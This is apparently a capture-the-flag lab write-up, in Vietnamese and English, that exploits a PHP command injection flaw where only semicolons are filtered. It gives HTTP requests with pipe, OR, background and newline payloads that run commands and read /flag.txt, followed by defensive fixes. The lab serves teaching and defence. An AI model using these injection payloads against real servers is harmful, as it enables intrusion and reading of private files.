# CMDi-002 Solution Writeup

## Vulnerability Analysis

### Bản Chất Lỗ Hổng

Ứng dụng có lỗ hổng **OS Command Injection** trong chức năng preview document, mặc dù đã có cố gắng filtering.

### Vulnerable Code Pattern

```php
$filename = $_POST['file'];

// Incomplete filtering - only blocks semicolon
$filename = str_replace(';', '', $filename);

$output = shell_exec("cat /var/www/docs/" . $filename);
echo $output;
```

**Vấn đề kỹ thuật:**
1. Filter chỉ chặn **semicolon (`;`)** - incomplete blocklist
2. **Pipe (`|`)** và các operators khác vẫn hoạt động
3. User input vẫn được concatenate trực tiếp vào command

### Tại Sao Filter Không Đủ?

**Filter Analysis Methodology** (từ Knowledge Base):

| Question | Answer trong lab này |
|----------|---------------------|
| Filter client-side hay server-side? | Server-side |
| Filter special characters hay commands? | Chỉ filter `;` |
| Allowlist hay blocklist? | **Blocklist** (chỉ block `;`) |

> ⚠️ **Blocklist approach luôn có gaps**. Không thể enumerate tất cả dangerous characters.

---

## Exploitation Workflow

### Phase 1: RECON - Quan Sát Filter Behavior

**Step 1.1: Test Normal Functionality**

**Request:**
```http
POST /preview HTTP/1.1
Host: localhost:5102
Content-Type: application/x-www-form-urlencoded

file=sample.txt
```

**Response:**
```
This is a sample document.
Lorem ipsum dolor sit amet...
```

**Step 1.2: Test Semicolon Injection (từ Lab 1)**

**Request:**
```http
POST /preview HTTP/1.1

file=sample.txt; id
```

**Response:**
```
cat: /var/www/docs/sample.txt id: No such file or directory
```

**Observation:**
- Semicolon bị **remove** (`sample.txt; id` → `sample.txt id`)
- Command thành: `cat /var/www/docs/sample.txt id` (2 files, không phải 2 commands)
- Error message cho thấy semicolon đã bị filter

---

### Phase 2: HYPOTHESIS - Filter Analysis

**Giả thuyết**: Filter chỉ remove semicolon, các operators khác không bị ảnh hưởng.

**Test plan:**
1. Test pipe `|`
2. Test OR `||`
3. Test AND `&&`
4. Test background `&`
5. Test newline `%0a`

---

### Phase 3: EXPLOITATION - Bypass Filter

**Step 3.1: Test Pipe Operator**

**Request:**
```http
POST /preview HTTP/1.1

file=sample.txt | id
```

**Response:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

✅ **SUCCESS!** Pipe operator không bị filter!

**Phân tích kỹ thuật:**

Command thực tế:
```bash
cat /var/www/docs/sample.txt | id
```

**Behavior của pipe:**
1. `cat /var/www/docs/sample.txt` chạy trước
2. Output được pipe vào `id` command
3. `id` **ignore stdin** và chạy bình thường
4. Chỉ output của `id` được trả về

**Step 3.2: Test với File Không Tồn Tại**

**Request:**
```http
POST /preview HTTP/1.1

file=nonexistent | id
```

**Response:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
cat: /var/www/docs/nonexistent: No such file or directory
```

**Observation:**
- `cat` fail nhưng `id` vẫn execute
- Cả error của cat và output của id đều hiển thị

**Step 3.3: Tối Ưu Payload - Loại Bỏ Filename**

**Request:**
```http
POST /preview HTTP/1.1

file=| id
```

**Response:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

✅ **Cleaner output!**

Command: `cat /var/www/docs/| id`
- `cat` fail ngay lập tức (directory không phải file) - error có thể bị suppress
- `id` chạy và output được hiển thị

**Step 3.4: Test Các Operators Khác**

| Operator | Payload | Result |
|----------|---------|--------|
| `\|` | `\| id` | ✅ Works |
| `\|\|` | `x \|\| id` | ✅ Works (OR - cat fail nên id chạy) |
| `&&` | `sample.txt && id` | ❌ Fail (AND - cat phải success) |
| `&` | `& id` | ✅ Works (background) |

---

### Phase 4: VALIDATION - Thu Thập Flag

**Step 4.1: Reconnaissance**

**List root directory:**
```http
file=| ls -la /
```

**Response:**
```
drwxr-xr-x   1 root root 4096 Jan 15 10:00 .
...
-r--r--r--   1 root root   38 Jan 15 10:00 flag.txt
...
```

Flag file found at `/flag.txt`!

**Step 4.2: Read Flag**

**Request:**
```http
POST /preview HTTP/1.1
Content-Type: application/x-www-form-urlencoded

file=| cat /flag.txt
```

**Response:**
```
FLAG{p1p3_0p3r4t0r_byp4ss3s_f1lt3r}
```

✅ **FLAG CAPTURED!**

---

## Deep Dive: Pipe vs Semicolon

### Behavioral Comparison

| Aspect | Semicolon (`;`) | Pipe (`\|`) |
|--------|-----------------|-------------|
| Execution | Sequential | Pipeline |
| Dependency | Independent | Output → Input |
| If cmd1 fails | cmd2 still runs | cmd2 still runs |
| Output handling | Both outputs shown | Usually only cmd2 output |
| Use case | Run multiple unrelated commands | Chain command outputs |

### Khi Nào Dùng Pipe Thay Vì Semicolon?

1. **Semicolon bị filter** - như trong lab này
2. **Cần suppress output của original command** - pipe đôi khi cleaner
3. **Payload size limit** - `| id` ngắn hơn `; id` về behavior

### Why `| command` Works Alone

Input: `| whoami`
Command: `cat /var/www/docs/| whoami`

Parsing:
1. Shell thấy `|` là pipe operator
2. Trước `|`: `cat /var/www/docs/` (fail - is directory)
3. Sau `|`: `whoami` (execute bình thường)
4. `whoami` không cần stdin → output username

---

## Alternative Payloads

### Sử dụng OR Operator
```
file=nonexistent || cat /flag.txt
```
Logic: cat nonexistent **fail** → cat /flag.txt runs

### Sử dụng Newline (nếu không bị filter)
```
file=sample.txt%0acat /flag.txt
```
Command trở thành 2 lines:
```
cat /var/www/docs/sample.txt
cat /flag.txt
```

### Sử dụng Background Operator
```
file=& cat /flag.txt
```
Chạy cat (fail) trong background, cat /flag.txt chạy foreground.

---

## Final Payload

```
| cat /flag.txt
```

**URL Encoded:**
```
file=%7C%20cat%20%2Fflag.txt
```

---

## Flag

```
FLAG{p1p3_0p3r4t0r_byp4ss3s_f1lt3r}
```

---

## Key Learnings

### 1. Blocklist Filtering Always Has Gaps

- Filter chỉ block `;` → nhiều alternatives vẫn work
- **Blocklist approach fundamentally flawed**
- Attacker chỉ cần tìm **một** bypass

### 2. Shell Has Multiple Operators

| Operator | Function |
|----------|----------|
| `;` | Sequential execution |
| `\|` | Pipe output |
| `\|\|` | OR - run if previous fails |
| `&&` | AND - run if previous succeeds |
| `&` | Background execution |
| `\n` | Newline separator |

### 3. Pipe Operator Characteristics

- Không cần command trước thành công
- Command sau có thể ignore stdin
- Useful khi `;` bị filter

### 4. Filter Analysis Methodology

Luôn hỏi:
1. Filter ở đâu? (client/server)
2. Filter cái gì? (chars/commands/patterns)
3. Allowlist hay blocklist?
4. Có encoding bypass không?

---

## Defense Recommendations

### 1. Allowlist Instead of Blocklist
```php
// Chỉ accept alphanumeric và một số chars cụ thể
if (!preg_match('/^[a-zA-Z0-9._-]+$/', $filename)) {
    die("Invalid filename");
}
```

### 2. Block ALL Shell Metacharacters
```php
$dangerous = [';', '|', '&', '$', '`', '(', ')', '{', '}', '<', '>', '\n', '\r'];
foreach ($dangerous as $char) {
    if (strpos($filename, $char) !== false) {
        die("Invalid character detected");
    }
}
```

### 3. Avoid Shell Entirely
```php
// Sử dụng file_get_contents thay vì cat
$path = "/var/www/docs/" . basename($filename);
if (file_exists($path) && is_readable($path)) {
    echo file_get_contents($path);
}
```

### 4. Use escapeshellarg()
```php
$filename = escapeshellarg($_POST['file']);
$output = shell_exec("cat /var/www/docs/" . $filename);
```

---

## References

- [Command Chaining Operators](../../../../_knowledge_base/Web/Command%20Injection/02-exploitation.md#command-chaining-operators)
- [Filter Bypass Techniques](../../../../_knowledge_base/Web/Command%20Injection/04-filter-bypass.md)
- [Defense & Mitigation](../../../../_knowledge_base/Web/Command%20Injection/08-defense-mitigation.md)
